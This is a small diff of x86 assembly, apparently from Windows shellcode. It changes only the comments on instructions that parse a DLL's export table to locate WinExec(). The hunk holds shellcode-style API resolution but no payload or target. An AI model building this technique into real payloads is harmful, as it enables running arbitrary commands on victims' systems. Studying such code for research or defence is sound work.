@@ -44,8 +44,8 @@ start:
 	mov esi, [edx+0x24]         		; get Ordinals Table offset
 	add esi, ebx                		; get the exact location of the Ordinals Table
 	mov cx, [esi+ecx*2]			; get the index of WinExec() since each index is 2 bytes
-	mov esi, [edx+0x1c]         		; get AddressOfFunctions offset
-	add esi, ebx                		; get the exact location of the AddressOfFunctions
+	mov esi, [edx+0x1c]         		; get AddressOfFunctions (AddressTable) offset
+	add esi, ebx                		; get the exact location of the AddressOfFunctions (AddressTable)
 	mov esi, [esi+ecx*4]			; get the offset address of WinExec()
 	add esi, ebx                		; get the exact location of WinExec()
 	xor ecx, ecx 				; make ecx == 0
